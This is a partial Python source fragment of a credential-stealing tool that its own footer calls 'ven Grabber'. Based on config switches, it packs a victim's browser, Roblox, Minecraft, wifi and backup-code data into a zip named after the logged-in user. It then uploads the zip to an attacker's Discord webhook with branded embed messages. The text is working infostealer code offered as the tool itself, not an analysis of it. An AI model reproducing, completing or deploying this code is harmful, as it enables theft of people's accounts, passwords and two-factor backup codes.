...
def main(webhook: str):
    ...
    data = {
        "username": "Ven 7way",
        "avatar_url": "https://cdn.discordapp.com/attachments/1121117899579478077/1128206517909332069/images.jpg"
    }

    _file = f'{localappdata}\\ven-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'ven-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'ven-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "ven Grabber | hosted by venn hihi boyy"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1121117899579478077/1128206517909332069/images.jpg"
                    }
                }
            ],
            "username": "ven",
                ...
                "embeds": [
                    {
                        ...
                        "footer": {
                            "text": "ven Grabber | hosted by ven hihi boy"
                        },
                    }
                ],
                "username": "ven",
